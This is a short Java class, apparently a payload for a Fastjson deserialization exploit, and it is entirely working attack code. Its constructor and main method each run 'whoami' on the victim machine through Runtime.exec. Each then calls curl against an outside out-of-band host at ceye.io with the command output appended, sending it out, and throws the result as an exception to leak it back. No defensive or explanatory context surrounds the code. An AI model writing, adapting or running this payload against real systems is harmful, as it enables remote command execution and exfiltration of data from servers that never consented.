import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
public class Fastjson_dns {
    public static String exec(String cmd) throws Exception {
        String sb = "";
        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null)
            sb += lineStr + "\n";
        inBr.close();
        in.close();
        return sb;
    }
    public Fastjson_dns() throws Exception {
        String result = "";
        result = exec("whoami");
        String cmd = "curl http://in0i3v.ceye.io/" + result;
        throw new Exception(exec(cmd));
    }
    public static void main(String[] args) throws Exception {
        String result = "";
        result = exec("whoami");
        String cmd = "curl http://in0i3v.ceye.io/" + result;
        throw new Exception(exec(cmd));
    }
}